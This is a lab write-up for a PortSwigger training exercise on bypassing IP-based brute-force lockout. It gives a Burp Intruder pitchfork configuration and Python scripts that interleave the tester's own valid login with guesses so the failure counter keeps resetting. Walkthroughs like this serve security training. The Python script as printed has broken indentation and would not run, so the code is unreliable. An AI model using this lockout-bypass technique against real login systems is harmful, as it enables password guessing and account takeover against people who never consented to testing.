# [Lab: Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

## Lab

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Analysis

1. If you log in incorrectly more than 3 times, you will be blocked for 1 minute from the 4th time even if you log in correctly
2. can't bypass prevention using the `X-Forwarded-For` header.

## Solutions

Every 2 times brute force, log in to `wiener` account, then continue brute force will not be blocked

1. intruder:

- mode pitchfork
- payload positions:

  ```text
  username=§§&password=§§
  ```

- payload:
  - create username set 1 using python:

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ python -c "print('carlos\ncarlos\nwiener\n'*51)" > payload1
  ```

  - create password set 2 using python:
    - save candidate passwords to file named `password`
    - python source:

    ```python
    def main():
    with open('password') as file:
      index = 0
      for line in file:
      index += 1
      if index % 3 == 0:
        print('peter')
        index += 1
      print(line.rstrip())


    if __name__ == '__main__':
    main()
    ```

  - save to `payload2`

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ python genpayload2.py > payload2
  ```

- Resource pool:
  - max concurrent pool: 1

=> solved
